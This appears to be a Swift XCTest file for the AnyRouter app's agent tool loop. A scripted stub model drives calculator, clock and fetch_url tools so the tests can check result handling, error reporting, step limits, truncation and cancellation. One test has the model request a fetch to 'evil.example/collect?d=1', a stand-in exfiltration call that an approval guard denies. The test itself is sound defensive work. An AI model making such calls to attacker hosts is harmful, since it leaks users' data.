import Foundation
import XCTest

@testable import AnyRouter

/// The agent loop end to end with real tools: a scripted model (a stubbed HTTP endpoint that reads the conversation it is
/// sent and answers from the tool messages in it) drives `AnyRouterEngine` and `AgentToolHost`. Nothing here needs a network
/// or a language model, but a tool result that never reached the model, or a reply that ignores it, fails these tests.
final class AgentLoopScenarioTests: XCTestCase {
    // MARK: Scripted model

    enum Step: Sendable {
        /// Ask for these tools in one round.
        case calls([(name: String, arguments: String)])
        /// Reply in text, built from the tool messages sent so far.
        case answer(@Sendable ([String]) -> String)
    }

    private final class Recorder: @unchecked Sendable {
        private let lock = NSLock()
        private var bodies: [[String: Any]] = []
        func add(_ body: [String: Any]) -> Int { lock.withLock { bodies.append(body); return bodies.count } }
        var all: [[String: Any]] { lock.withLock { bodies } }
    }

    private struct Run {
        var deltas: [ChatDelta]
        var error: Error?
        var requests: [[String: Any]]

        var text: String { deltas.compactMap { if case .text(let piece) = $0 { return piece } else { return nil } }.joined() }
        var toolEvents: [ChatDelta] { deltas.filter { if case .toolCall = $0 { return true }; if case .toolResult = $0 { return true }; return false } }
        var results: [ToolResult] { deltas.compactMap { if case .toolResult(let result) = $0 { return result } else { return nil } } }

        /// The `tool` messages of request `index`, in order.
        func toolMessages(_ index: Int) -> [String] {
            ((requests[index]["messages"] as? [[String: Any]]) ?? [])
                .filter { $0["role"] as? String == "tool" }
                .compactMap { $0["content"] as? String }
        }
    }

    private static func body(of request: URLRequest) -> [String: Any] {
        var data = request.httpBody
        if data == nil, let stream = request.httpBodyStream {
            stream.open()
            defer { stream.close() }
            var collected = Data()
            var buffer = [UInt8](repeating: 0, count: 4096)
            while stream.hasBytesAvailable {
                let count = stream.read(&buffer, maxLength: buffer.count)
                if count <= 0 { break }
                collected.append(buffer, count: count)
            }
            data = collected
        }
        return (data.flatMap { try? JSONSerialization.jsonObject(with: $0) } as? [String: Any]) ?? [:]
    }

    private static func sse(_ events: [String]) -> StubRegistry.Reply {
        StubRegistry.Reply(body: Data(events.map { "data: \($0)\n\n" }.joined().utf8))
    }

    private static func json(_ object: Any) -> String {
        String(decoding: try! JSONSerialization.data(withJSONObject: object), as: UTF8.self)
    }

    /// Plays `steps`; once they run out the last one repeats.
    private func play(
        steps: [Step], host: AgentToolHost, user: String = "hi"
    ) async -> Run {
        let recorder = Recorder()
        let api = StubbedAPI { request in
            let body = AgentLoopScenarioTests.body(of: request)
            let number = recorder.add(body)
            let messages = (body["messages"] as? [[String: Any]]) ?? []
            let toolMessages = messages.filter { $0["role"] as? String == "tool" }.compactMap { $0["content"] as? String }
            switch steps[min(number, steps.count) - 1] {
            case .calls(let calls):
                let wire = calls.enumerated().map { index, call -> [String: Any] in
                    [
                        "index": index, "id": "call_\(number)_\(index)", "type": "function",
                        "function": ["name": call.name, "arguments": call.arguments],
                    ]
                }
                let chunk = AgentLoopScenarioTests.json(["choices": [["delta": ["tool_calls": wire]]]])
                return AgentLoopScenarioTests.sse([chunk, #"{"choices":[{"delta":{},"finish_reason":"tool_calls"}]}"#, "[DONE]"])
            case .answer(let make):
                let chunk = AgentLoopScenarioTests.json(["choices": [["delta": ["content": make(toolMessages)]]]])
                return AgentLoopScenarioTests.sse([chunk, #"{"choices":[{"delta":{},"finish_reason":"stop"}]}"#, "[DONE]"])
            }
        }
        let engine = AnyRouterEngine(tokens: FakeTokens("k"), config: api.config, session: api.session)
        let model = testModel(id: "anyrouter/test/model", source: .anyrouter)
        var deltas: [ChatDelta] = []
        var failure: Error?
        do {
            for try await delta in engine.stream(
                model: model, messages: [ChatMessage(role: .user, content: user)], params: GenerationParams(), tools: host) {
                deltas.append(delta)
            }
        } catch {
            failure = error
        }
        return Run(deltas: deltas, error: failure, requests: recorder.all)
    }

    private func clock(zone: String = "GMT") -> CurrentDateTimeTool {
        var tool = CurrentDateTimeTool()
        tool.now = { Date(timeIntervalSince1970: 1_800_000_000) }  // Friday 15 January 2027, 08:00 UTC
        tool.deviceTimeZone = { TimeZone(identifier: zone)! }
        return tool
    }

    private func host(
        _ tools: [any BuiltInTool]? = nil, approver: (any ToolApproving)? = nil, said: [String] = []
    ) -> AgentToolHost {
        AgentToolHost(
            builtIns: tools ?? [CalculatorTool(), clock()], search: nil, mcp: nil,
            approver: approver, exfiltration: ExfiltrationGuard(userTexts: said))
    }

    private struct Deny: ToolApproving {
        func decide(_ request: ToolApprovalRequest) async -> ToolDecision { .deny }
    }

    private let echo: Step = .answer { "Result: " + $0.joined(separator: " | ") }

    // MARK: Scenarios

    func testASingleCallAndTheAnswerUsesItsValue() async {
        let run = await play(steps: [.calls([("calculator", #"{"expression":"17 * 23"}"#)]), echo], host: host(), user: "What is 17 times 23?")
        XCTAssertNil(run.error)
        XCTAssertEqual(run.requests.count, 2)
        XCTAssertEqual(run.toolMessages(1), ["391"], "the tool result reached the model")
        XCTAssertEqual(run.text, "Result: 391")
        XCTAssertEqual(run.results, [ToolResult(callID: "call_1_0", name: "calculator", text: "391", isError: false)])
        XCTAssertEqual(run.deltas.last, .done(finishReason: "stop"))
    }

    func testAChainOfThreeToolsKeepsEveryResultInTheConversation() async {
        let run = await play(steps: [
            .calls([("current_date_time", "{}")]),
            .calls([("calculator", #"{"expression":"365 / 7"}"#)]),
            .calls([("calculator", #"{"expression":"2 + 2"}"#)]),
            echo,
        ], host: host())
        XCTAssertNil(run.error)
        XCTAssertEqual(run.requests.count, 4)
        XCTAssertEqual(run.toolMessages(1).count, 1)
        XCTAssertEqual(run.toolMessages(2).count, 2)
        XCTAssertEqual(run.toolMessages(3), [
            "Current local time: 08:00, Friday 15 January 2027 (UTC).", "52.1428571429", "4",
        ])
        XCTAssertTrue(run.text.contains("Friday 15 January 2027"))
        XCTAssertTrue(run.text.contains("52.1428571429"))
        // Events come in order: call, result, call, result, call, result.
        XCTAssertEqual(run.toolEvents.count, 6)
        XCTAssertEqual(run.results.map(\.name), ["current_date_time", "calculator", "calculator"])
    }

    func testTwoToolsInOneRoundBothComeBackInOrder() async {
        let run = await play(steps: [
            .calls([("calculator", #"{"expression":"6 * 7"}"#), ("current_date_time", "{}")]), echo,
        ], host: host())
        XCTAssertEqual(run.toolMessages(1), ["42", "Current local time: 08:00, Friday 15 January 2027 (UTC)."])
    }

    func testAToolErrorIsReadByTheModelNotThrown() async {
        let run = await play(steps: [.calls([("calculator", #"{"expression":"1 / 0"}"#)]), echo], host: host())
        XCTAssertNil(run.error)
        XCTAssertEqual(run.results.first?.isError, true)
        XCTAssertEqual(run.toolMessages(1), ["Division by zero."])
        XCTAssertEqual(run.text, "Result: Division by zero.")
    }

    func testAToolTheHostDoesNotHaveIsReportedBack() async {
        let run = await play(steps: [.calls([("teleport", "{}")]), echo], host: host())
        XCTAssertNil(run.error)
        XCTAssertEqual(run.toolMessages(1), ["Unknown tool: teleport."])
        XCTAssertEqual(run.results.first?.isError, true)
    }

    func testBadArgumentsAreReportedBack() async {
        let run = await play(steps: [.calls([("calculator", "not json")]), echo], host: host())
        XCTAssertEqual(run.toolMessages(1), ["The arguments are not a JSON object."])
    }

    func testADeniedApprovalReachesTheModelAndTheToolNeverRuns() async {
        let run = await play(steps: [.calls([("fetch_url", #"{"url":"https://evil.example/collect?d=1"}"#)]), echo],
                            host: host([FetchURLTool()], approver: Deny(), said: ["hello"]))
        XCTAssertNil(run.error)
        XCTAssertEqual(run.toolMessages(1), ["The user did not allow this tool call."])
        XCTAssertEqual(run.results.first?.isError, true)
    }

    func testALinkTheUserWroteIsNotAskedAbout() async {
        struct Page: BuiltInTool {
            let name = "fetch_url", title = "Page", summary = "", description = "", schema: JSONSchema = "{}"
            func run(_ arguments: JSONValue) async throws -> String { "page text" }
        }
        let run = await play(steps: [.calls([("fetch_url", #"{"url":"https://example.com/a"}"#)]), echo],
                            host: host([Page()], approver: Deny(), said: ["read https://example.com/b"]))
        XCTAssertEqual(run.toolMessages(1), ["page text"])
    }

    func testAModelThatNeverStopsCallingToolsIsCutOffAndStillAnswers() async {
        let counting = Counter()
        struct Tick: BuiltInTool {
            let name = "tick", title = "Tick", summary = "", description = "", schema: JSONSchema = "{}"
            let counter: Counter
            func run(_ arguments: JSONValue) async throws -> String { "tick \(counter.next())" }
        }
        let steps = (0..<AnyRouterEngine.maxToolSteps).map { _ in Step.calls([("tick", "{}")]) } + [echo]
        let run = await play(steps: steps, host: host([Tick(counter: counting)]))
        XCTAssertNil(run.error)
        XCTAssertEqual(run.requests.count, AnyRouterEngine.maxToolSteps + 1)
        XCTAssertEqual(run.requests.last?["tool_choice"] as? String, "none")
        XCTAssertEqual(run.results.count, AnyRouterEngine.maxToolSteps)
        XCTAssertTrue(run.text.hasPrefix("Result: tick 1 | tick 2"))
        XCTAssertEqual(run.deltas.last, .done(finishReason: "stop"))
    }

    func testAHugeResultIsCutBeforeItGoesBackToTheModel() async {
        struct Wall: BuiltInTool {
            let name = "wall", title = "Wall", summary = "", description = "", schema: JSONSchema = "{}"
            func run(_ arguments: JSONValue) async throws -> String { String(repeating: "x", count: 50_000) }
        }
        let run = await play(steps: [.calls([("wall", "{}")]), echo], host: host([Wall()]))
        let sent = run.toolMessages(1).first ?? ""
        XCTAssertTrue(sent.hasSuffix("[Result cut at 20000 characters.]"))
        XCTAssertLessThan(sent.count, 20_100)
    }

    func testAskingTheTimeNeverSurfacesAPlaceName() async {
        let vietnam = clock(zone: "Asia/Ho_Chi_Minh")
        let run = await play(steps: [.calls([("current_date_time", "{}")]), echo], host: host([vietnam]), user: "What time is it?")
        XCTAssertEqual(run.toolMessages(1), ["Current local time: 15:00, Friday 15 January 2027 (UTC+7)."])
        for place in ["Asia", "Ho_Chi_Minh", "Hanoi", "Vietnam"] {
            XCTAssertFalse(run.text.contains(place), place)
        }
        XCTAssertTrue(run.text.contains("15:00"))
    }

    func testStoppingDuringAToolEndsTheReplyWithoutAnotherRequest() async throws {
        struct Slow: BuiltInTool {
            let name = "slow", title = "Slow", summary = "", description = "", schema: JSONSchema = "{}"
            let started: Flag
            func run(_ arguments: JSONValue) async throws -> String {
                started.value = true
                try await Task.sleep(for: .seconds(30))
                return "late"
            }
        }
        let recorder = Recorder()
        let api = StubbedAPI { request in
            _ = recorder.add(AgentLoopScenarioTests.body(of: request))
            let wire: [[String: Any]] = [["index": 0, "id": "c", "type": "function", "function": ["name": "slow", "arguments": "{}"]]]
            return AgentLoopScenarioTests.sse([AgentLoopScenarioTests.json(["choices": [["delta": ["tool_calls": wire]]]]), #"{"choices":[{"delta":{},"finish_reason":"tool_calls"}]}"#, "[DONE]"])
        }
        let started = Flag()
        let engine = AnyRouterEngine(tokens: FakeTokens("k"), config: api.config, session: api.session)
        let model = testModel(id: "anyrouter/test/model", source: .anyrouter)
        let toolHost = host([Slow(started: started)])
        let consumer = Task {
            for try await _ in engine.stream(model: model, messages: [], params: GenerationParams(), tools: toolHost) {}
        }
        for _ in 0..<500 where !started.value { try await Task.sleep(for: .milliseconds(10)) }
        XCTAssertTrue(started.value)
        consumer.cancel()
        _ = await consumer.result
        XCTAssertEqual(recorder.all.count, 1)
    }
}
